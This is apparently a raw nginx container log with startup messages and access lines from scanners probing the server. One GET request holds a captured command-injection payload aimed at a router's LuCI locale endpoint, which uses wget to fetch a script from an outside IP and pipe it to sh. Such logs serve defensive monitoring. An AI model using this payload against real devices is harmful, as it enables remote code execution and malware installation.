/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
/docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf
10-listen-on-ipv6-by-default.sh: info: /etc/nginx/conf.d/default.conf differs from the packaged version
/docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh
/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
/docker-entrypoint.sh: Configuration complete; ready for start up
2024/11/06 20:44:43 [notice] 19#19: using the "epoll" event method
2024/11/06 20:44:43 [notice] 19#19: nginx/1.27.2
2024/11/06 20:44:43 [notice] 19#19: built by gcc 13.2.1 20240309 (Alpine 13.2.1_git20240309) 
2024/11/06 20:44:43 [notice] 19#19: OS: Linux 5.10.102.2-microsoft-standard
2024/11/06 20:44:43 [notice] 19#19: getrlimit(RLIMIT_NOFILE): 1024:1048576
2024/11/06 20:44:43 [notice] 19#19: start worker processes
2024/11/06 20:44:43 [notice] 19#19: start worker process 46
10.92.0.10 - - [07/Nov/2024:00:37:47 +0000] "GET / HTTP/1.0" 200 459 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "-"
10.92.0.9 - - [07/Nov/2024:00:40:12 +0000] "MGLNDD_4.157.215.67_80" 400 157 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:00:43:11 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x0F\xB3\x1Fj?\xC4M\x1FP\x0E\x9EZ\x1F\xE4\xD0\xDEU{\xCB`\xDD\x22\x90F\xC3\x1A%\xE5i#\xD4\xF9 \xAF9\xA2Y]\xDE;q\x03\x91\xC4\xDBY_\xE2s\xCE\x1F\x103\xA0\xF4\x98\x81\xDA\x95Z\xFC\xC8\x9BZ\xDE\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:00:43:11 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03LmK\xECB2S\xAA#|\xD2V\xED\xF5zq\xBAVd\xCD\xB72\xDA\x85B\xB2\xFC\xF5\x89\xD8Q\xA7\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:00:46:52 +0000] "GET /portal/redlion HTTP/1.1" 200 459 "-" "Mozilla/5.0 zgrab/0.x" "-"
10.92.0.9 - - [07/Nov/2024:00:55:13 +0000] "GET / HTTP/1.1" 200 459 "-" "-" "-"
10.92.0.9 - - [07/Nov/2024:01:12:35 +0000] "GET /login.rsp HTTP/1.1" 200 459 "-" "Hello World" "-"
10.92.0.9 - - [07/Nov/2024:01:28:22 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.24%2Fl+-O-%7C+sh%60) HTTP/1.1" 200 459 "-" "Go-http-client/1.1" "-"
10.92.0.10 - - [07/Nov/2024:01:38:22 +0000] "GET /aaa9 HTTP/1.1" 200 459 "-" "Mozilla/5.0 zgrab/0.x" "-"
10.92.0.10 - - [07/Nov/2024:01:38:24 +0000] "GET /aab8 HTTP/1.1" 200 459 "-" "Mozilla/5.0 zgrab/0.x" "-"
